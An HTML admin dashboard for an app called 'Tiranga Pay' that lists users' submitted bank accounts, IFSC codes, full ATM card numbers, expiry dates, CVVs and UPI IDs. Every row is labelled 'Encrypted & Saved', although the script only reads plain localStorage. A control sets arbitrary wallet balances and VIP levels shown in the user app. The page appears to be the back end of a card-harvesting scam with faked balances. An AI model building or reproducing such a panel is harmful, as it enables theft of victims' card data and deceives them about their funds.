<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tiranga Pay - Admin Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #0066ff;
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --border-color: #334155;
            --success: #10b981;
            --danger: #ef4444;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Plus Jakarta Sans', sans-serif;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            padding: 20px;
        }

        .admin-container {
            max-width: 1000px;
            margin: 0 auto;
        }

        .admin-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: var(--card-bg);
            padding: 20px;
            border-radius: 16px;
            border: 1px solid var(--border-color);
            margin-bottom: 24px;
        }

        .admin-title {
            font-size: 22px;
            font-weight: 800;
            color: white;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .admin-title i { color: #38bdf8; }

        .back-home-btn {
            background: var(--primary);
            color: white;
            padding: 8px 16px;
            border-radius: 8px;
            text-decoration: none;
            font-size: 13px;
            font-weight: 600;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 16px;
            margin-bottom: 24px;
        }

        .stat-card {
            background: var(--card-bg);
            padding: 20px;
            border-radius: 16px;
            border: 1px solid var(--border-color);
        }

        .stat-card h4 {
            font-size: 13px;
            color: var(--text-muted);
            margin-bottom: 8px;
        }

        .stat-card .value {
            font-size: 24px;
            font-weight: 700;
            color: #38bdf8;
        }

        .section-box {
            background: var(--card-bg);
            border-radius: 16px;
            padding: 20px;
            border: 1px solid var(--border-color);
            margin-bottom: 24px;
        }

        .section-box h3 {
            font-size: 16px;
            font-weight: 700;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .data-table {
            width: 100%;
            border-collapse: collapse;
            text-align: left;
            font-size: 13px;
        }

        .data-table th, .data-table td {
            padding: 12px;
            border-bottom: 1px solid var(--border-color);
        }

        .data-table th {
            color: var(--text-muted);
            font-weight: 600;
        }

        .badge-success {
            background: rgba(16, 185, 129, 0.2);
            color: #34d399;
            padding: 4px 8px;
            border-radius: 6px;
            font-size: 11px;
            font-weight: 600;
        }

        .control-group {
            display: grid;
            grid-template-columns: 1fr 1fr auto;
            gap: 12px;
            align-items: center;
            margin-top: 10px;
        }

        .control-group input {
            background: #0f172a;
            border: 1px solid var(--border-color);
            padding: 10px;
            border-radius: 8px;
            color: white;
            font-size: 14px;
            outline: none;
        }

        .admin-btn {
            background: var(--success);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
        }

        .empty-text {
            color: var(--text-muted);
            text-align: center;
            padding: 20px;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="admin-container">
        <div class="admin-header">
            <div class="admin-title">
                <i class="fa-solid fa-user-shield"></i> Tiranga Pay Admin Panel
            </div>
            <a href="index.html" class="back-home-btn"><i class="fa-solid fa-arrow-left"></i> Back to App</a>
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <h4>Total Users Linked</h4>
                <div class="value" id="adminTotalUsers">1</div>
            </div>
            <div class="stat-card">
                <h4>Pending Bank Submissions</h4>
                <div class="value" id="adminPendingBanks">0</div>
            </div>
            <div class="stat-card">
                <h4>Active Commission Gateway</h4>
                <div class="value">7.0%</div>
            </div>
        </div>

        <!-- Wallet Balance Controller -->
        <div class="section-box">
            <h3><i class="fa-solid fa-wallet text-sky-400"></i> Manage User Wallet Balance & VIP</h3>
            <div class="control-group">
                <input type="text" id="adminNewBalance" placeholder="Enter Amount (e.g. 5000)" value="0.00">
                <input type="text" id="adminNewVip" placeholder="VIP Level (e.g. V2)" value="V1">
                <button class="admin-btn" onclick="updateUserWallet()">Update User App</button>
            </div>
        </div>

        <!-- Submitted Bank Cards Data -->
        <div class="section-box">
            <h3><i class="fa-solid fa-building-columns"></i> Submitted User Bank Accounts & ATM Cards</h3>
            <div style="overflow-x: auto;">
                <table class="data-table">
                    <thead>
                        <tr>
                            <th>User Name</th>
                            <th>Bank Name</th>
                            <th>Account No</th>
                            <th>IFSC</th>
                            <th>ATM Card / CVV</th>
                            <th>UPI ID</th>
                            <th>Status</th>
                        </tr>
                    </thead>
                    <tbody id="adminBankTableBody">
                        <!-- Dynamic data from users will load here -->
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        window.addEventListener('DOMContentLoaded', () => {
            loadAdminData();
        });

        function loadAdminData() {
            const savedBanks = JSON.parse(localStorage.getItem('tiranga_saved_banks')) || [];
            const tbody = document.getElementById('adminBankTableBody');
            const totalUsersEl = document.getElementById('adminTotalUsers');
            const pendingBanksEl = document.getElementById('adminPendingBanks');

            totalUsersEl.textContent = savedBanks.length > 0 ? savedBanks.length : 1;
            pendingBanksEl.textContent = savedBanks.length;

            if (savedBanks.length === 0) {
                tbody.innerHTML = `<tr><td colspan="7" class="empty-text">No bank accounts submitted yet from user app.</td></tr>`;
                return;
            }

            tbody.innerHTML = '';
            savedBanks.forEach((bank, index) => {
                tbody.innerHTML += `
                    <tr>
                        <td><strong>${bank.accHolder}</strong><br><small style="color:#94a3b8">${bank.regMobile}</small></td>
                        <td>${bank.bankName}<br><small style="color:#94a3b8">${bank.accType}</small></td>
                        <td>${bank.accNumber}</td>
                        <td>${bank.ifscCode}</td>
                        <td>${bank.atmCard}<br><small style="color:#94a3b8">Exp: ${bank.expiryDate} | CVV: ${bank.cvv}</small></td>
                        <td>${bank.upiId || 'N/A'}</td>
                        <td><span class="badge-success">Encrypted & Saved</span></td>
                    </tr>
                `;
            });
        }

        function updateUserWallet() {
            const newBal = document.getElementById('adminNewBalance').value;
            const newVip = document.getElementById('adminNewVip').value;

            localStorage.setItem('tiranga_wallet_balance', '₹ ' + newBal);
            localStorage.setItem('tiranga_vip_level', 'Level: ' + newVip);
            alert('User app wallet & VIP level updated successfully!');
        }
    </script>
</body>
</html>
